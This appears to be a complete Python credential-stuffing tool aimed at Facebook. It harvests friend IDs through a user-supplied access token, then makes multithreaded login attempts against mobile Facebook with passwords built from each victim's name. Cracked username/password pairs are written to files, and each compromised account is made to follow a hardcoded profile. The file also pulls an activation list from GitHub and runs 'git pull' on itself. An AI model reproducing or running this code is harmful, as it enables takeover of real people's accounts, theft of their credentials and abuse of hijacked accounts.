#!/usr/bin/python3
#-*-coding:utf-8-*-
# Update V1.6

### Import Module
import os
try:
    import requests
except ImportError:
    print('\n [×] requests module not installed!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Futures module not installed!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Bs4 module not installed!...\n')
    os.system('pip install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, threading, itertools,base64
from concurrent.futures import ThreadPoolExecutor as AzimVau
from datetime import datetime
from bs4 import BeautifulSoup
def xoshnaw():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  print("\x1b[37;1mYOUR ID : "+id)
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/sajad-kh3n/file/main/fila").text
    if id in httpCaht:
      print("\033[1;92mYOUR ID IS ACTIVE...!")
      msg = str(os.geteuid())
      time.sleep(0.3)
      pass
    else:
      print("\x1b[1;91mID ACTIVATE (telegram) INBOX  @FFRFF3")
      os.system('xdg-open https://t.me/FFRFF3')
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
    	xoshnaw()
xoshnaw()
ct = datetime.now()
n = ct.month
bulan = ["JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "OCT", "NOV", "DEC"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
Z = "\033[1;30m" # Hitam

my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)

data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
###########################################################################################
done = False

try:
    rq = requests.get('https://raw.githubusercontent.com/89299/old2k5/main/cr3kmax.txt').text
except requests.exceptions.ConnectionError:
    print('\nNO INTERNET CONNECTION\n')
    exit()
    

# lempankkkkkkkk
def xox(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

ugent= [
               'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/247.0.0.5.130;]',
               'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+ Opera/7.1', 
               'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]', 
               'Mozilla/5.0 (Linux; Android 8.0.0; LDN-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]',
               'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]', 
               'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]', 
               'Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/283.0.0.6.117;]', 
               'Mozilla/5.0 (Windows NT 10.0; OPPSS :)64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]'
               ]


### Logo
def logo():
        os.system("clear")
        print("""%s
.____/\ .______  .______  ._____.___ .______  
:   /  \:      \ : __   \ :         |:      \ 
|.  ___/|   .   ||  \____||   \  /  ||   .   |
|     \ |   :   ||   :  \ |   |\/   ||   :   |
|      \|___|   ||   |___\|___| |   ||___|   |
|___\  /    |___||___|          |___|    |___|
     \/                                       
                                              
 
\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m
	 [➣] OWNER :        sajadalbkat
	 [➣] GITHUB:          sajos79
	
\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m
	
\x1b[0;91m       USE FLIGHT MODE FOR 3 SEC
\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m                                                                          """%(0))
def linex():
        print
	
#CRACK SELESAI
def result(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        print("\n\n\033[94;1m THE PROCESS HAS BEEN COMPLETED")
        print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: %s/%s"%(str(len(ok)),str(len(cp))))
        os.sys.exit()
    else:
        print('\n\n [%s!%s] NO RESULT :(:('%(H,H));exit()


#MASUK TOKEN
def azim():
    os.system('clear')
    logo()
    print(" %s              LOGIN FACEBOOK "%(H))
    print("")
    cookie = input("\n %s[%s?%s] ENTER TOKEN : %s"% (K,P,K,H))
    try:
        nam = requests.get('https://graph.facebook.com/me?access_token=%s'%(cookie)).json()['name']
        open('.token.txt', 'w').write(cookie)
        xox("%s\n\n LOGIN SUCCESSFUL...! "%(H));time.sleep(2)
        azim_vau()
    except KeyError:
        print('\n %s[%s×%s] INVALID TOKEN'%(H,H,));time.sleep(1);azim()
    except UnboundLocalError:
        print('\n %s[%s×%s] INVALID TOKEN'%(H,H,H));time.sleep(1);azim()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] NO CONNECTION\n'%(H,H,H))

### ORANG GANTENG ###
def azim_vau():
    os.system('git pull')
    os.system('clear')
    logo()
    ipm = requests.get(url_ip).json()     
    IP = ipm["origin"]
    try:
        tokenz = open('.token.txt', 'r').read()
    except IOError:
        print('\n %s[%s×%s] INVALID TOKEN'%(M,M,H));time.sleep(2);os.system('rm -rf .token.txt');azim()
    try:
        nam = requests.get('https://graph.facebook.com/me?access_token=%s'%(tokenz)).json()['name'].upper()
    except KeyError:
        print('\n %s[%s×%s] INVALID TOKEN'%(H,H,H));time.sleep(2);os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt');azim()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] NO CONNECTION\n'%(H,H,H))
    try:a = requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json();ip = a["query"];loc = a["country"].upper()
    except KeyError:ip = " "
    print('%s '%(O))
    print('%s [%s➣%s] %sUSERNAME   %s: %s%s'%(N,M,N,M,N,M,nam))
    print('%s [%s➣%s] %sIP ADDR    %s: %s%s'%(N,M,N,M,N,M,ip))
    print('%s [%s➣%s] %sCOUNTRY    %s: %s%s'%(N,M,N,M,N,M,loc))
    print('%s [%s➣%s] %sSTATUS     %s: %sPAID '%(N,M,N,M,N,M))
    print('')
    print('%s [%s01%s] %sCRACK FROM FRIENDS/PUBLIC'%(N,M,N,M));time.sleep(0.03)
    print('%s [%s02%s] %sCRACK FROM PUBLIC %s(MULTI CRACK)'%(N,M,N,M,N));time.sleep(0.03)
    print('%s [%s03%s] %sCRACK FROM FILE'%(N,M,N,M));time.sleep(0.03)
    print('%s [%s04%s] %sCHAT sajad'%(N,M,N,M));time.sleep(0.03)
    
    print('%s [%s00%s] %sLOGOUT %s'%(N,M,N,M,N));time.sleep(0.03)
    pepek = input('\n %s[%s➣%s] MENU : '%(N,M,N))
    if pepek == '':
        print("\n %s[%s➣%s] DON'T EMPTY... !"%(N,M,N));time.sleep(2);azim_vau()
    elif pepek in['1','01']:
            try:
                print("\n [➣] INPUT ID")
                user = input(' [➣] ENTER PUBLIC ID: ')
                #_memek_ = __convert__(user)
                r = requests.get(f"https://graph.facebook.com/{user}?fields=friends.fields(id,name)&access_token={tokenz}").json()["friends"]
                for x in r["data"]:
                    id.append(x['id'] + '|' + x['name'])
            except KeyError:
                print('\n %s[%s×%s] FOOL ID NOT PUBLIC'%(H,H,H));time.sleep(3);azim_vau()
    elif pepek in['2','02']:
        _ngocok_(tokenz)
        
    elif pepek in['3','03']:
        filelist = input('\033[92;1m  INPUT FILE: ')
        try:
            for line in open(filelist, 'r').readlines():
              id.append(line.strip())
        except:
               print('\n %s[%s×%s] FILE [%s%s%s] NOT FOUND FIRST DUMP CHECK 1 TO 4 OPTIONS BRO'%(N,M,N,M,filelist,N));time.sleep(3)
    elif pepek in['4','03']:
        os.system('xdg-open https://wa.me/+2348110044418') 
    elif pepek in['0','00']:
        print("")
        titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
        for x in titik:
            sys.stdout.write('\r %s[%s➣%s] DELETE TOKEN %s'%(N,M,N,x)); sys.stdout.flush()
            time.sleep(1)
        os.system('rm -rf .token.txt')
        exit('\n %s[%s✓%s]%s SUCCESSFULLY DELETED TOKEN'%(N,M,N,H))
    else:
        print('\n %s[%s➣%s] MENU [%s%s%s] NOT FOUND, CHECK THE MENU BRO!'%(N,M,N,M,pepek,N));time.sleep(2);azim_vau()
    return __crack__().plerr(id)


# CRACK ID RANDOM
def _ngocok_(__ppk__):
    try:
        nanya_keun = int(input('\n %s[%s➣%s] ENTER LIMIT %s:%s '%(K,P,K,P,H)))
    except:nanya_keun=1
    print(" [%s➣%s] TYPE'ME' IF YOU WANT TO CRACK FROM FRIENDS LIST\n"%(K,K))
    for mnh in range(nanya_keun):
        mnh +=1
        user = input(' [%s➣%s] ENTER ID OR USERNAME %s%s%s : '%(N,M,N,mnh,H))
        #_memek_ = __convert__(user)
        try:
            r = requests.get(f"https://graph.facebook.com/{user}?fields=friends.fields(id,name)&access_token={__ppk__}").json()["friends"]
            for x in r["data"]:
                id.append(x['id'] + '|' + x['name'])
        except (KeyError,IOError):
            print('\n [➣] FAILED TO RETRIEVE ID, PROBABLY ID IS NOT PUBLIC');time.sleep(3);azim_vau()

# USERNAME CONVERT TO ID
def __convert__(user):
    if user == "me":
        return {"_puck_":user}
    else:
        payload = {"fburl": "https://m.facebook.com/{}".format(user), "check": "Lookup"}
        if "facebook" in user:
            payload = {"fburl": user, "check": "Lookup"}
        mmk = requests.post(url_lookup, data=payload).content
        xxx = BeautifulSoup(mmk, "html.parser")
        idt = xxx.find("span", id="code")
        asw = idt.text
        return {"_puck_":asw}


# MULAI CRACK
class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self,id):
        self.id = id
        print('\n [%s➣%s] TOTAL ID : %s%s%s' %(N,M,N,len(self.id),H))
        ___mrerror___ = input(' [%s?%s] USE DEFAULT /MANUAL PASSWORD [d/m]: '%(N,M))
        if ___mrerror___ in ('M', 'm'):
            print('\n %s[%s!%s] USE , (COMMA) FOR SEPARATOR EXAMPLE: PASSWORD123,PASSWORD12345,ETC.'%(H,H,H))
            while True:
                pwek = input('\n [%s?%s] ENTER PASSWORD : '%(H,H))
                print(' [➣] CRACK WITH PASSWORD -➣ [ %s%s%s ]' % (H, pwek, H))
                if pwek == '':
                    print("\n %s[%s×%s] DON'T EMPTY THE PASSWORD BRO"%(H,H,H))
                elif len(pwek)<=5:
                    print('\n %s[%s×%s] PASSWORD MINIMUM 6 CHARACTERS'%(H,H,H))
                else:
                    def __chi__(ysc=None): 
                        logo()
                        print("\033[93;3m TOTAL IDS : \033[92;1m"+str(len(self.id)))
                        print("\033[94;3m sajad CLONING  \033[92;1m\033[91;1m\x1b[0m")
                        linex()
                        with AzimVau(max_workers=30) as (__azim__):
                            for ikeh in self.id:
                                try:
                                    kimochi = ikeh.split('|')[0]
                                    __azim__.submit(self.__metode__, kimochi, ysc, "m.facebook.com")
                                except: pass

                        result(ok,cp)

        elif ___mrerror___ in ('D', 'd'):
            self.__pler__()
        else:
            print('\n %s[%s×%s] m/d IDIOT!'%(H,H,H));self.plerr(id)

    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r {K}[{H}sajad{K}] {H}{loop}{P}/{M}{len(self.id)} {H}OK-:{len(ok)} - {K}CP-:{len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f'\r {H}[sajad-OK] {user}|{pw}{N}')
                    wrt = ' [✓] %s|%s' % (user,pw)
                    ok.append(wrt)
                    open('OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    print(f'\r {K}[sajad-CP] {user}|{pw}{N}')
                    wrt = ' [×] %s|%s' % (user,pw)
                    cp.append(wrt)
                    open('CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    
                else:
                    continue

            loop+=1
        except:
            self.__metode__(user, pw, cebok)

#    <- Bot followers -➣
    def follow(self,session,coki):
        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=553503218",cookies={"cookie":coki}).text,"html.parser")
        get = r.find("a",string="Follow").get("href")
        session.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":coki}).text

    def __pler__(self):
        logo()
        print("\033[93;1m TOTAL IDS : \033[92;3m"+str(len(self.id)))
        print("\033[94;1m sajad CLONING ACTIVATED \033[92;3m\033[91;3m\x1b[0m")
        linex()
        with AzimVau(max_workers=30) as kirim:
            for yntkts in self.id: 
                try:
                    uid, name = yntkts.split('|')
                    xz = name.split(' ')
                    if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                        pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                    else:
                        pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                    kirim.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                except:
                    pass

        result(ok,cp)


if __name__ == '__main__':
        azim_vau()